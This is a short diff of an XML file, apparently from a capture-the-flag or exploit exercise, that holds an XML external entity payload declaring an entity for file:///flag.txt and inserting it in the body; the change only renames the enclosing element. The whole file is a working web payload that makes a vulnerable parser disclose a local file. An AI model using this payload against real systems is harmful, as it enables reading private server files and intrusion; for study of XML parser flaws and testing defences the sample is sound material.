@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
 <root>
-	<data>
+	<datas>
 		&xxe;
-	</data>
+	</datas>
 </root>
